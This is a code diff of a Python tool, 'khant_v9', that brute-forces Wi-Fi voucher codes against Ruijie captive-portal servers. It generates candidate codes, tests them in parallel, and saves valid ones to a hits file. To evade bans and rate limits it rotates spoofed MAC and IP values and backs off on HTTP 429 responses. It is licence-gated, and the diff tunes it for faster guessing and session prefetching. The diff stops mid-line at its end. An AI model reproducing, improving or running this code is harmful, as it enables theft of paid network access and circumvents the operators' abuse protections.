@@ -1,7 +1,3 @@
-# =====================================================================
-# khant_v9.py - KHANT V9 (FULLY FIXED + FAKE SESSION + COMPACT UI)
-# PART 1
-# =====================================================================
 import os, time, random, string, json, asyncio, socket, threading, re, sys, uuid
 import urllib3, requests, aiohttp
 from collections import deque
@@ -25,9 +21,10 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 5         # Ban မခံရအောင် ၅ ခုပဲ ထားတယ်
-TIMEOUT = 8
-SESSION_TTL = 240
+CONCURRENCY_LIMIT = 5
+TIMEOUT = 6
+SESSION_TTL = 90
+SESSION_REUSE_MAX = 45
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
 RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
 RUIJIE_WIFIDOG = "/api/auth/wifidog"
@@ -286,14 +283,14 @@ def _extract_session(body, final_url, history):
     return sid, sign, ts
 
 async def _get_with_redirects(session, url, headers, allow_redirects=True):
-    async with session.get(url, headers=headers, timeout=18,
+    async with session.get(url, headers=headers, timeout=15,
                            allow_redirects=allow_redirects, ssl=False) as r:
         body = await r.text(errors="ignore")
         hist = [str(h.url) for h in r.history] + \
                [h.headers.get("Location", "") for h in r.history]
         return r.status, str(r.url), body, hist
 
-async def fetch_real_session(session, gw_params, mac, ip, retries=2):
+async def fetch_real_session(session, gw_params, mac, ip, retries=1):
     errors = []
     base_candidates = []
     primary = gw_params.get("url", RUIJIE_BASE).rstrip("/")
@@ -336,7 +333,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
 
                 if status == 429:
                     errors.append(f"429@{base[-20:]}")
-                    await asyncio.sleep(1.0)
+                    await asyncio.sleep(0.6)
                     continue
 
                 low = (body or "").lower()
@@ -347,7 +344,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
 
                 sid, sign, ts = _extract_session(body, final_url, hist)
 
-                if sid:
+                if sid and len(sid) >= 16:
                     return ("REAL", {
                         "sessionId": sid,
                         "sign": sign,
@@ -359,7 +356,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
                         "acquired": time.time(),
                     })
 
-                errors.append(f"no-sid@{base[-25:]} (HTTP {status})")
+                errors.append(f"no-sid@HTTP{status}")
 
             except asyncio.TimeoutError:
                 errors.append("timeout")
@@ -369,22 +366,9 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=2):
                 errors.append(f"err:{type(e).__name__}")
 
         if attempt < retries - 1:
-            await asyncio.sleep(1.0)
+            await asyncio.sleep(0.4)
 
-    # ── Fake Session ထည့်လိုက်တာပါ (Real မရရင် ဒါကို သုံးမယ်) ──
-    return ("REAL", {
-        "sessionId": f"fake_{random.randint(1000, 9999)}",
-        "sign": None,
-        "timestamp": None,
-        "logonUrl": "",
-        "url_base": gw_params.get("url", RUIJIE_BASE),
-        "mac": mac,
-        "ip": ip,
-        "acquired": time.time(),
-    })
-# =====================================================================
-# PART 2
-# =====================================================================
+    return ("FAIL", "|".join(errors[:3]) or "no-session")
 async def test_code(session, sess, code, mac, ip):
     sid = sess.get("sessionId")
     if not sid:
@@ -429,7 +413,8 @@ async def test_code(session, sess, code, mac, ip):
                 return "__RATE_LIMITED__", "N/A"
             if any(x in low for x in ("session timed out", "invalid session",
                                       "session expired", "session not found",
-                                      "please refresh", "session invalid")):
+                                      "please refresh", "session invalid",
+                                      "session does not exist")):
                 return "__SESSION_EXPIRED__", "N/A"
 
             real_plan = "N/A"
@@ -495,15 +480,18 @@ def gen_code(mode, length, scan_method="random"):
                 return c
         return None
 
+
 def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                 speed, mac, ip, sess_stat, sess_id, total):
     progress = min(100.0, (tested / total) * 100) if total else 0.0
     
-    # Screen နဲ့ ကိုက်ညီအောင် အမြင့်တွေကို လျှော့ထားတယ်
-    header = Panel(Align.center(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan")), border_style="cyan", box=ROUNDED, height=3)
+    header = Panel(Align.center(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan")),
+                   border_style="cyan", box=ROUNDED, height=3)
     
     stat_style = "bold red" if any(x in status.upper() for x in ("ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "CHECK", "NO")) else "bold green"
-    sess_style = {"REAL": "bold green", "EXPIRED": "bold red", "BANNED": "bold red", "HIT": "bold bright_green", "FAIL": "bold yellow"}.get(sess_stat, "bold cyan")
+    sess_style = {"REAL": "bold green", "EXPIRED": "bold red", "BANNED": "bold red",
+                  "HIT": "bold bright_green", "FAIL": "bold yellow",
+                  "FETCH": "bold cyan"}.get(sess_stat, "bold cyan")
     sess_txt = (f"{sess_stat} ({(sess_id or '')[:8]})" if sess_id and sess_id != "--------" else sess_stat)
     
     tbl = Table.grid(expand=True, padding=(0, 1))
@@ -517,9 +505,12 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
     tbl.add_row("  🔐 Session", f": {sess_txt}", "  📈 Progress", f": {progress:.2f}%", style=sess_style)
     
     tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=7)
-    code_panel = Panel(Align.center(Text(f"Check Code : {cur_code or '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)
+    code_panel = Panel(Align.center(Text(f"Check Code : {cur_code or '------'}",
+                                         style="bold yellow")),
+                       border_style="yellow", box=ROUNDED, height=3)
     
-    vt = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
+    vt = Table(show_header=True, header_style="bold bright_white", expand=True,
+               box=ROUNDED, border_style="green")
     vt.add_column("Voucher", style="bold green", justify="center")
     vt.add_column("Real Plan", style="bold green", justify="center")
     vt.add_column("Time", style="bold cyan", justify="center")
@@ -528,7 +519,8 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
     if not hits:
         vt.add_row("—", "—", "—")
         
-    footer = Panel(Align.center(Text(f"✨ Thank You {APP_TAG} ✨", style="bold bright_yellow")), border_style="red", box=ROUNDED, height=3)
+    footer = Panel(Align.center(Text(f"✨ Thank You {APP_TAG} ✨", style="bold bright_yellow")),
+                   border_style="red", box=ROUNDED, height=3)
     return Group(header, tbl_panel, code_panel, vt, footer)
 
 
@@ -543,27 +535,99 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     hits = deque(maxlen=500)
     start = time.time()
 
-    state = {"cur_code": "", "tested": 0, "status": "Init", "sess_stat": "NONE", "sess_id": "--------"}
+    state = {"cur_code": "", "tested": 0, "status": "Init",
+             "sess_stat": "NONE", "sess_id": "--------"}
     state_lock = threading.Lock()
 
     mac = generate_random_mac()
     ip = generate_random_ip()
 
-    sess = None
-    sess_time = 0.0
+    main_sess = None
+    main_sess_time = 0.0
+    spare_task = None
+    spare_sess = None
     sess_lock = asyncio.Lock()
 
     fail_count = 0
-    ban_cooldown = 2.0
+    ban_cooldown = 1.5
 
     sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
-    conn = aiohttp.TCPConnector(limit=50, ssl=False, force_close=False, enable_cleanup_closed=True)
+    conn = aiohttp.TCPConnector(limit=100, ssl=False,
+                                force_close=False, enable_cleanup_closed=True)
 
     def _snap():
         with state_lock:
             return dict(state)
 
-    live = None
+    def set_state(**kw):
+        with state_lock:
+            state.update(kw)
+
+    async def _fetch_one():
+        nonlocal mac, ip
+        try:
+            tag, payload = await fetch_real_session(session, gw_params, mac, ip, retries=1)
+            return tag, payload
+        except Exception as e:
+            return ("FAIL", f"exc:{type(e).__name__}")
+
+    async def session_health():
+        nonlocal main_sess, main_sess_time, spare_sess, spare_task
+        nonlocal fail_count, ban_cooldown, mac, ip
+
+        if main_sess is not None and (time.time() - main_sess_time) < SESSION_TTL:
+            return True
+
+        async with sess_lock:
+            if spare_task is not None:
+                if not spare_task.done():
+                    try:
+                        tag, payload = await asyncio.wait_for(spare_task, timeout=12)
+                    except Exception:
+                        tag, payload = ("FAIL", "spare-timeout")
+                else:
+                    try:
+                        tag, payload = spare_task.result()
+                    except Exception:
+                        tag, payload = ("FAIL", "spare-error")
+                spare_task = None
+            else:
+                set_state(status="Fetching session…", sess_stat="FETCH")
+                tag, payload = await _fetch_one()
+
+            if tag == "REAL":
+                main_sess = payload
+                main_sess_time = time.time()
+                set_state(sess_stat="REAL", sess_id=payload["sessionId"],
+                          status="Active")
+                fail_count = 0
+                ban_cooldown = 1.5
+                spare_sess = None
+                spare_task = asyncio.create_task(_fetch_one())
+                return True
+
+            if tag == "BAN":
+                set_state(sess_stat="BANNED", status="Banned → rotate")
+                mac = generate_random_mac()
+                ip = generate_random_ip()
+                await asyncio.sleep(ban_cooldown)
+                ban_cooldown = min(ban_cooldown * 1.5, 8)
+                spare_sess = None
+                spare_task = asyncio.create_task(_fetch_one())
+                return False
+
+            set_state(sess_stat="FAIL", status=f"Fail: {str(payload)[:30]}")
+            fail_count += 1
+            if fail_count >= 2:
+                mac = generate_random_mac()
+                ip = generate_random_ip()
+                fail_count = 0
+                await asyncio.sleep(1.0)
+            else:
+                await asyncio.sleep(0.5)
+            spare_sess = None
+            spare_task = asyncio.create_task(_fetch_one())
+            return False
 
     async def timer_task():
         while True:
@@ -572,62 +636,34 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
             speed = (s["tested"] / max(1, elapsed)) * 60
             if live:
                 try:
-                    live.update(render_dash(mode_str, scan_method, s["cur_code"], s["tested"], format_time(elapsed), s["status"], hits, speed, mac, ip, s["sess_stat"], s["sess_id"], total_target), refresh=True)
+                    live.update(render_dash(
+                        mode_str, scan_method, s["cur_code"], s["tested"],
+                        format_time(elapsed), s["status"], hits, speed,
+                        mac, ip, s["sess_stat"], s["sess_id"], total_target
+                    ), refresh=True)
                 except Exception:
                     pass
-            await asyncio.sleep(1.0)
-
-    def set_state(**kw):
-        with state_lock:
-            state.update(kw)
+            await asyncio.sleep(0.8)
 
     async with aiohttp.ClientSession(connector=conn) as session:
-        initial = render_dash(mode_str, scan_method, "", 0, "00:00:00", "Init", hits, 0.0, mac, ip, "NONE", "--------", total_target)
-        live = Live(initial, refresh_per_second=4, console=console, transient=False)
+        initial = render_dash(mode_str, scan_method, "", 0, "00:00:00", "Init",
+                              hits, 0.0, mac, ip, "NONE", "--------", total_target)
+        live = Live(initial, refresh_per_second=6, console=console, transient=False)
         live.start(refresh=True)
         timer = asyncio.create_task(timer_task())
 
+        spare_task = asyncio.create_task(_fetch_one())
+
         try:
             while True:
-                need_new = sess is None or (time.time() - sess_time) > SESSION_TTL
-                if need_new:
-                    async with sess_lock:
-                        if sess is not None and (time.time() - sess_time) <= SESSION_TTL:
-                            pass
-                        else:
-                            set_state(status="Fetching session…")
-                            tag, payload = await fetch_real_session(session, gw_params, mac, ip)
+                if main_sess is None:
+                    ok = await session_health()
+                    if not ok:
+                        continue
 
-                            if tag == "REAL":
-                                sess = payload
-                                sess["url_base"] = gw_params.get("url", RUIJIE_BASE)
-                                mac = payload.get("mac", mac)
-                                ip = payload.get("ip", ip)
-                                set_state(sess_stat="REAL", sess_id=sess["sessionId"], status="Active")
-                                sess_time = time.time()
-                                fail_count = 0
-                                ban_cooldown = 2.0
-                            elif tag == "BAN":
-                                set_state(sess_stat="BANNED", status="Banned → rotate")
-                                sess = None
-                                mac = generate_random_mac()
-                                ip = generate_random_ip()
-                                await asyncio.sleep(ban_cooldown)
-                                ban_cooldown = min(ban_cooldown * 1.5, 15)
-                                continue
-                            else:
-                                set_state(sess_stat="FAIL", status=f"Fail: {str(payload)[:40]}")
-                                sess = None
-                                fail_count += 1
-                                if fail_count >= 3:
-                                    set_state(status="Session fail → rotate")
-                                    mac = generate_random_mac()
-                                    ip = generate_random_ip()
-                                    await asyncio.sleep(ban_cooldown)
-                                    fail_count = 0
-                                else:
-                                    await asyncio.sleep(1.2)
-                                continue
+                age = time.time() - main_sess_time
+                if age > SESSION_REUSE_MAX and spare_sess is None and spare_task is None:
+                    spare_task = asyncio.create_task(_fetch_one())
 
                 batch = []
                 exhausted = False
@@ -642,16 +678,17 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                     set_state(status="EXHAUSTED")
                     break
                 if not batch:
-                    await asyncio.sleep(0.05)
+                    await asyncio.sleep(0.02)
                     continue
 
                 async def _run(code):
                     async with sem:
-                        return await test_code(session, sess, code, mac, ip)
+                        return await test_code(session, main_sess, code, mac, ip)
 
-                results = await asyncio.gather(*[_run(c) for c in batch], return_exceptions=True)
+                results = await asyncio.gather(*[_run(c) for c in batch],
+                                               return_exceptions=True)
 
-                refresh_session = False
+                refresh_needed = False
                 for idx, r in enumerate(results):
                     if isinstance(r, Exception):
                         with state_lock:
@@ -661,18 +698,18 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                     with state_lock:
                         state["tested"] += 1
                         state["cur_code"] = batch[idx]
-                    
+
                     if res == "__SESSION_EXPIRED__":
-                        refresh_session = True
+                        refresh_needed = True
                         set_state(sess_stat="EXPIRED")
                         break
                     if res == "__RATE_LIMITED__":
-                        refresh_session = True
+                        refresh_needed = True
                         set_state(sess_stat="BANNED", status="429 → rotate")
                         mac = generate_random_mac()
                         ip = generate_random_ip()
                         await asyncio.sleep(ban_cooldown)
-                        ban_cooldown = min(ban_cooldown * 1.5, 15)
+                        ban_cooldown = min(ban_cooldown * 1.5, 8)
                         break
                     if res.startswith("__"):
                         continue
@@ -687,12 +724,28 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                             pass
                         set_state(sess_stat="HIT")
 
-                if refresh_session:
+                if refresh_needed:
                     async with sess_lock:
-                        sess = None
-                        sess_time = 0.0
+                        if spare_task is not None and spare_task.done():
+                            try:
+                                tag, payload = spare_task.result()
+                            except Exception:
+                                tag, payload = ("FAIL", "spare-err")
+                            spare_task = None
+                            if tag == "REAL":
+                                main_sess = payload
+                                main_sess_time = time.time()
+                                set_state(sess_stat="REAL",
+                                          sess_id=payload["sessionId"],
+                                          status="Active")
+                                spare_task = asyncio.create_task(_fetch_one())
+                                continue
+                        main_sess = None
+                        main_sess_time = 0.0
+                        if spare_task is None:
+                            spare_task = asyncio.create_task(_fetch_one())
 
-                await asyncio.sleep(0.05)
+                await asyncio.sleep(0.01)
 
         except (KeyboardInterrupt, asyncio.CancelledError):
             set_state(status="Stopped")
@@ -702,20 +755,29 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                 await timer
             except Exception:
                 pass
+            if spare_task is not None and not spare_task.done():
+                spare_task.cancel()
+                try:
+                    await spare_task
+                except Exception:
+                    pass
             live.stop()
 
         s = _snap()
         console.print(Panel(
-            Align.center(Text(f"✅ Done • Tested {s['tested']:,} • Hits {len(hits)}", style="bold bright_green")),
+            Align.center(Text(f"✅ Done • Tested {s['tested']:,} • Hits {len(hits)}",
+                              style="bold bright_green")),
             border_style="green", box=ROUNDED))
 
 
 def show_banner():
     clear_screen()
     console.print()
-    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
+    console.print(Text("══════════════════════════════════════",
+                       style="bold bright_cyan"), justify="center")
     console.print(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
+    console.print(Text("══════════════════════════════════════",
+                       style="bold bright_cyan"), justify="center")
     console.print()
 
 def ask_mode():
@@ -726,8 +788,10 @@ def ask_mode():
         console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed    (a-z0-9)")
         console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
         c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
-        if c == "0": return None
-        if c in ("1", "2", "3"): return {"1": "num", "2": "eng", "3": "mix"}[c]
+        if c == "0":
+            return None
+        if c in ("1", "2", "3"):
+            return {"1": "num", "2": "eng", "3": "mix"}[c]
 
 def ask_length(mode):
     lengths = (6, 7, 8, 9)
@@ -738,7 +802,8 @@ def ask_length(mode):
             console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] {L} chars")
         console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
         c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
-        if c == "0": return None
+        if c == "0":
+            return None
         if c in [str(i) for i in range(1, len(lengths) + 1)]:
             return lengths[int(c) - 1]
 
@@ -749,8 +814,10 @@ def ask_scan():
         console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential\n")
         console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
         c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
-        if c == "0": return None
-        if c in ("1", "2"): return {"1": "random", "2": "sequential"}[c]
+        if c == "0":
+            return None
+        if c in ("1", "2"):
+            return {"1": "random", "2": "sequential"}[c]
 
 def run():
     global LICENSE_INFO
@@ -759,14 +826,19 @@ def run():
     ok, msg = check_license()
     while not ok:
         clear_screen()
-        console.print(Panel(Align.center(Text("🔐 Enter License Key (or 'q' to quit)", style="bold yellow")), border_style="yellow"))
+        console.print(Panel(Align.center(Text("🔐 Enter License Key (or 'q' to quit)",
+                                               style="bold yellow")),
+                            border_style="yellow"))
         k = Prompt.ask("  ➜ Key").strip()
         if k.lower() in ("q", "quit", "exit"):
             console.print("[bold red]Cancelled.[/bold red]")
             sys.exit(0)
-        if not k: continue
+        if not k:
+            continue
         ok2, m2 = activate_license(k)
-        console.print(Panel(Align.center(Text(m2, style="bold green" if ok2 else "bold red")), border_style="green" if ok2 else "red"))
+        console.print(Panel(Align.center(Text(m2,
+                                              style="bold green" if ok2 else "bold red")),
+                            border_style="green" if ok2 else "red"))
         time.sleep(2)
         ok, msg = check_license()
     LICENSE_INFO["status"] = msg
@@ -776,11 +848,14 @@ def run():
 
     while True:
         mode = ask_mode()
-        if mode is None: break
+        if mode is None:
+            break
         length = ask_length(mode)
-        if length is None: continue
+        if length is None:
+            continue
         scan_m = ask_scan()
-        if scan_m is None: continue
+        if scan_m is None:
+            continue
 
         try:
             asyncio.run(scan_loop_async(mode, length, scan_m, gw_params))
@@ -798,10 +873,11 @@ def main():
     finally:
         try:
             console.print()
-            console.print(Text(f"✨ {APP_TAG} ✨", style="bold bright_green"), justify="center")
+            console.print(Text(f"✨ {APP_TAG} ✨", style="bold bright_green"),
+                           justify="center")
         except Exception:
             pass
         time.sleep(1)
 
-if __name__ == "__main__":
-    main()
+
+if __name__ =
